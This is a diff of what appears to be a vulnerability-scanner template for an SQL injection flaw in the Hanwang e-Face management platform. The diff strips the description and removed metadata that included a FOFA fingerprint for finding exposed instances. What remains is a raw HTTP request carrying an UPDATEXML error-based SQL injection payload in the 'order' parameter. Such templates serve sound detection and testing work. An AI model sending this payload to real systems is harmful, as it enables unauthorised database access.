@@ -3,12 +3,8 @@ info:
   name: 汉王e脸通综合管理平台 queryManageDeviceLogs存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qhyyplvu5tm1xgg8'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qhyyplvu5tm1xgg8
-    fofa: body="async src=\"/pwacompat.min.js" && body="minimum-scale=1" && body="window.routerBase"||title="汉王智慧园区"
 http:
 - raw:
   - 'GET /manage/systemLogMgr/queryManageDeviceLogs.do?recoToken=67mds2pxXQb&t=1751959258092&begin=2025-07-01+00:00:00&end=2025-07-31+23:59:59&page=1&pageSize=25&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
